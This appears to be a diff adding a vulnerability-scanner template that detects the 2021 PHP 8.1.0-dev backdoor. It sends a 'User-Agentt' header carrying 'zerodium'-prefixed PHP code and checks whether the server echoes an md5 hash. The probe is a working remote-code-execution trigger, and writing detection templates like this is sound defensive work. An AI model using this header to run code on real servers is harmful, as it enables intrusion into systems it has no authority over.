@@ -1,0 +1,34 @@
+id: php-810-dev-backdoor
+
+info:
+  name: php-810-dev-backdoor
+  author: pwnhxl
+  severity: high
+  description: PHP version 8.1.0-dev was implanted with a backdoor on March 28, 2021, but the backdoor was quickly discovered and removed. When this backdoor is present on a server, an attacker can execute arbitrary code by sending a User-Agentt header.
+  reference:
+    - https://news-web.php.net/php.internals/113838
+    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
+    - https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
+    - https://github.com/vulhub/vulhub/tree/master/php/8.1-backdoor
+  tags: php,backdoor
+
+variables:
+  num: "{{rand_int(1000000, 9999999)}}"
+
+requests:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        User-Agentt: zerodiumvar_dump(print(md5({{num}})));
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5({{num}})}}'
+
+      - type: status
+        status:
+          - 200
